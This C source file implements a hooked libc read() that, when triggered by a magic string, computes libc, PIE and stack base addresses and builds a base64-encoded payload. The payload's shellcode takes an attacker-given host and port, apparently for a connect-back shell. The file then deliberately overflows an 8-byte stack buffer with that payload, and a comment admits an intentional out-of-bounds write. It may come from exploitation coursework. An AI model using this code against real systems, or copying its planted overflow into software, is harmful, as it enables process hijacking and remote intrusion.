#define _GNU_SOURCE
#include <netdb.h>
#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "addresses.h"
#include "base64.h"
#include "payload.h"
#include "strnstr.h"

static Pointer pageBase(Pointer p) {
	return (Pointer) (((unsigned long) p) & (-1 ^ getpagesize() - 1));
} // pageBase()

static Pointer elfBase(Pointer p) {
	const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};

	p = pageBase(p);
	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
		p -= getpagesize();

	return p;
} // elfBase()

static void overflow(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
	char buffer[8] = {0};

	baseAddressesPtr->buffer_base = &buffer;;
	dofixups(p, n, baseAddressesPtr);

	memcpy(buffer, p, n);
} // overflow()

static const char s_magic[]	= "xyzzy";
static const char s_makeload[]	= "MAKELOAD";
static const char s_dumpload[]	= "DUMPLOAD";
static const char s_testload[]	= "TESTLOAD";
static const char s_overflow[]	= "OVERFLOW";

static int initialized = 0;
static Payload payload;

typedef
ssize_t Read(int fd, void *buf, size_t count);
ssize_t read(int fd, void *buf, size_t count) {
	Read *libc_read = dlsym(RTLD_NEXT, "read");
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);

	if (p) {
		BaseAddresses baseAddresses = {
			.buffer_base = NULL,
			.libc_base   = elfBase(libc_read),
			.pie_base    = elfBase(read),
			.stack_base  = pageBase(&baseAddresses)
		};

		if (!initialized) {
			payload = baseload();
			initialized = 1;
		} // if

		p += strlen(s_magic);
		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);

			makeload(&payload, &baseAddresses);

			// Parse the stuff after MAKELOAD into s_host:port
			int nc, ns;
			char s_host[256];
			unsigned short port;

			ns = sscanf(p, "%n%255[^: \n]%n:%hu%n", &nc, s_host, &nc, &port, &nc);
	 		assert(ns >= 0 && ns <= 2);
			
			// Set the port to whatever we got from the sscanf (store it in host endian order)
			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);

			// See if the s_host string can be parsed by inet_aton()
			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0)
				for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
					for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
 						payload.pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];

			// Generate the payload that we will "echo" back
			unsigned char sPayload64[4096];
			size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));

			// Make room for the payload (where the request used to be).
			char *src = p + nc;
			char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
			int delta = dst - src;
			memmove(dst, src, delta);

			// Replace s_makeload with s_overflow
			memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
			p += strlen(s_overflow) - strlen(s_makeload);

			// Place the payload in the newly created space
			memcpy(p, sPayload64, nPayload64);

			// Adjust the number of characters read
			result += delta;

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload, &baseAddresses);
		else if (!strncmp(s_testload, p, strlen(s_testload)))
			overflow((Pointer)&payload, sizeof(payload), &baseAddresses);
		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
			size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) p, 65535);
			overflow(p, n256, &baseAddresses);
		} // else if
	} // if

	return result;
} // read()

#ifdef READHOOK_MAIN
int main(int argc, char **argv)
{
	fprintf(stderr, "Running as an executable\n");

	assert(sizeof(short) == 2);
	assert(sizeof(int) == 4);
	assert(sizeof(long) == 8);
	assert(sizeof(void *) == 8);
	assert(sizeof(Pointer) == 8);
	assert(sizeof(ptrdiff_t) == 8);
	assert(sizeof(Offset) == 8);
	assert(sizeof(AddressUnion) == 8);
	assert(sizeof(struct in_addr) == 4);
	assert(sizeof(ShellCodeUnion) == 76);
	assert(getpagesize() == 4096);
	assert((-1^(getpagesize()-1))==0xfffffffffffff000);

	payload = baseload();
	BaseAddresses baseAddresses = {
		.buffer_base = NULL,
		.libc_base   = elfBase(dlsym(RTLD_NEXT, "read")),
		.pie_base    = elfBase(read),
		.stack_base  = pageBase(&baseAddresses)
	};

	makeload(&payload, &baseAddresses);
	dumpload(&payload, &baseAddresses);
	overflow((Pointer)&payload, sizeof(payload), &baseAddresses);
} // main()
#endif
